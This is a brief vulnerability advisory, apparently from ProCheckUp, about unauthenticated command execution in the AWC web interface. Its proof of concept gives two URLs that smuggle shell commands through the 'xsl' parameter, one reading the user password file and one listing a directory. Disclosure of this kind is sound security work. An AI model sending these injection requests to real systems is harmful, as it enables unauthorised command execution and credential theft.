ProCheckUp has discovered that the AWC web user interface is vulnerable
to an unauthenticated command execution attack.
Proof of concept
The following demonstrate the command execution flaw:

1) Vulnerable to command execution

To read the user password file
http://target-domain.foo/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26cat
%20%22/usr/awc/www/users%22%26

To perform a directory listing
http://target-domain.foo/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26ls%
20%22/usr/awc/www/cgi-bin/%22%26

Consequences:
Command execution allows Unix commands to be remotely executed with the
permissions associated with the web service account. No authentication
is required to exploit this vulnerability.
How to fix
Ensure that the latest patches have been installed.
